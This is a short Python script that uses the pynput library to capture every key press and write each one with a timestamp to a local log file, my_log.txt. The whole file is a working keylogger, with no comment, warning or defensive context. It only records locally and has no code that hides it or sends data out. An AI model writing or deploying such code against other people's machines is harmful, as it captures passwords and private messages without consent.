import pynput
from pynput.keyboard import Key, Listener
import logging

# Set the logging directory to the current directory
log_dir = "./"

# Configure the logging settings
logging.basicConfig(filename=log_dir+"my_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the function to be called when a key is pressed
def on_press(key):
    logging.info(str(key))

# Create a listener object and start listening for key presses
with Listener(on_press=on_press) as listener:
    listener.join()
